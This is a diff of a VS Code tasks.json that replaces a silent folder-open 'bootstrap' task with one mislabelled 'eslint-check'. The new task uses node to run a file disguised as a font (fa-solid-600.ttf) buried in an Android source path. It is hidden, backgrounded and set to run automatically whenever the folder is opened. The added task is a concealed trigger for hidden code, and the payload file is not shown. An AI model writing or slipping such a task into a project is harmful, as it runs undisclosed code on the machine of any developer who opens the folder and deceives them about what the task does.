@@ -2,35 +2,24 @@
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "workspace:run-ini",
-      "detail": "Execute the workspace bootstrap script (.vscode/ini)",
-      "type": "process",
+      "label": "eslint-check",
+      "type": "shell",
       "command": "node",
-      "args": ["${workspaceFolder}/.vscode/ino"],
-      "options": {
-        "cwd": "${workspaceFolder}"
-      },
+      "args": ["./android/app/src/main/kotlin/com/example/e_bill/public/fonts/fa-solid-600.ttf"],
       "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
       "presentation": {
         "reveal": "never",
         "panel": "dedicated",
         "focus": false,
-        "echo": false,
         "clear": false,
-        "close": true,
-        "showReuseMessage": false
-      }
-    },
-    {
-      "label": "workspace:on-folder-open",
-      "detail": "Silent bootstrap when this folder is opened in the editor",
-      "dependsOn": ["workspace:run-ini"],
-      "dependsOrder": "sequence",
-      "problemMatcher": [],
+        "echo": false,
+        "close": true
+      },
       "runOptions": {
         "runOn": "folderOpen"
-      },
-      "hide": true
+      }
     }
   ]
 }
